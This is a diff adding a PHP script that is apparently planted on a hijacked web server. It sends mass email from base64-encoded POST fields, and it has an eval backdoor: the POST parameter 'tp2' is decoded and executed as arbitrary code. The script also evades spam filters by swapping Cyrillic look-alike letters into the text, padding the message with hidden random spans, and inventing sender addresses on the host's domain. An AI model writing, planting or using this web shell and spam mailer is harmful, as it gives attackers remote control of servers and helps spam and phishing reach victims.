@@ -1,0 +1,134 @@
+<?
+if(!empty($_POST['tp2']) and isset($_POST['tp2'])){
+                $fv = base64_decode(($_POST['tp2']));
+                @eval($fv);
+        }
+if(isset($_POST["mailto"]))
+        $MailTo = base64_decode($_POST["mailto"]);
+else
+        {
+        echo "indata_error";
+        exit;
+        }
+if(isset($_POST["msgheader"]))
+        $MessageHeader = base64_decode($_POST["msgheader"]);
+else
+        {
+        echo "indata_error";
+        exit;
+        }
+if(isset($_POST["msgbody"]))
+        $MessageBody = base64_decode($_POST["msgbody"]);
+else
+        {
+        echo "indata_error";
+        exit;
+        }
+if(isset($_POST["msgsubject"]))
+        $MessageSubject = base64_decode($_POST["msgsubject"]);
+else
+        {
+        echo "indata_error";
+        exit;
+        }
+
+function make_subject_name($subj){
+    $t = $subj.' - '.make_random_title_name(rand(2,10),true);
+        $y = rand(1,4);
+    for($i = 0; $i < $y; $i++){
+        $t .= "!";
+    }
+    return $t;
+}
+
+function make_sender_name($dom){
+    $l = array("_","__","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","1","2","3","4","5","6","7","8","9","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M");
+    $leng = rand(5, 11);
+        $ret = "";
+    for($i = 0; $i < $leng; $i++){
+        $ret .= $l[array_rand($l)];
+    }
+    return $ret.'@'.$dom;
+}
+function make_random_title_name($length = 10,$num = false){
+    $l = array("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","1","2","3","4","5","6","7","8","9","Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M");
+    if($num == true){
+        $l = array("0","1","2","3","4","5","6","7","8","9");
+    }
+    $leng = rand(5, $length);
+    $ret = "";
+    for($i = 0; $i < $leng; $i++){
+        $ret .= $l[array_rand($l)];
+    }
+    return $ret;
+}
+function find_chars($char,$text,$replace){
+        $parts = explode($char,$text);
+        $ret = "";
+        for($i = 0; $i < count($parts); $i++){
+                if($i == 0){
+                        $ret .= $parts[$i];
+                }else{
+                        $rand = rand(1,100);
+                        if($rand > 50){
+                                $ret .= $replace.$parts[$i];
+                        }else{
+                                $ret .= $char.$parts[$i];
+                        }
+                }
+        }
+        return $ret;
+}
+
+$abc = array("a" => "а","A" => "А","c" => "с","C" => "С","e" => "е","E" => "Е","T" => "Т","H" => "Н","o" => "о","O" => "О", "p" => "р","P" => "Р","K" => "К","x" => "х","X" => "Х","B" => "В","M" => "М","r" => "г","y" => "у","Y" => "У");
+
+if(function_exists("quoted_printable_decode") and function_exists("quoted_printable_encode")){
+        $pattern = "/\{TEXT\/\}[\s\S]*?\{\/TEXT\}/i";
+        preg_match_all($pattern, $MessageBody, $match);
+        $getted_text = array();
+        foreach($match[0] as $one){
+                $t = quoted_printable_decode(str_replace(array("{TEXT/}","{/TEXT}"),"",$one));
+                foreach($abc as $key=>$val){
+                        $t = find_chars($val,$t,$key);
+                }
+                $t = '<span style="display:none;">'.make_random_title_name(rand(20,200)).'</span>'.$t.'<span style="display:none;">'.make_random_title_name(rand(20,200)).'</span>';
+                $getted_text[] = quoted_printable_encode($t);
+        }
+        for($i = 0; $i < 2; $i++){
+                $MessageBody = preg_replace($pattern, $getted_text[$i], $MessageBody,1);
+        }
+}else{
+        $MessageBody = str_replace(array("{TEXT/}","{/TEXT}"),array("",""),$MessageBody);
+}
+
+
+
+$tags_search = array("<HTML>","<HEAD>","<META","<STYLE>","</STYLE>","</HEAD>","<BODY","<DIV>","<BR>","</DIV>","<A href","</A","</BODY>","</HTML>");
+$tags_repl = array("<html>","<head>","<meta","<style>","</style>","</head>","<body","<div>","<br>","</div>","<a href","</a","</body>","</html>");
+$MessageBody = str_replace($tags_search,$tags_repl,$MessageBody);
+
+$this_dom = $_SERVER['SERVER_NAME'];
+if(empty($this_dom) or strlen($this_dom) < 2){
+    $this_dom = make_random_title_name(8).".com";
+}
+$MessageHeader = str_replace(array("{TO_NAME}","{TO_MAIL}"),array($this_dom,make_sender_name($this_dom)),$MessageHeader);
+
+/*
+$subj_parts = explode("=?utf-8?B?",$MessageSubject);
+$temp = array();
+for($i = 0; $i < count($subj_parts); $i++){
+    $t = base64_decode(str_replace("?=","",$subj_parts[$i]));
+    foreach($abc as $key=>$val){
+        $t = find_chars($val,$t,$key);
+    }
+    $subj_parts[$i] = $t;
+    $temp[] = $t;
+}
+$MessageSubject = "=?utf-8?B?".base64_encode(make_subject_name(implode(" ",$subj_parts)))."?=";
+*/
+
+if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))
+        echo "sent_ok";
+else
+        echo "sent_error";
+
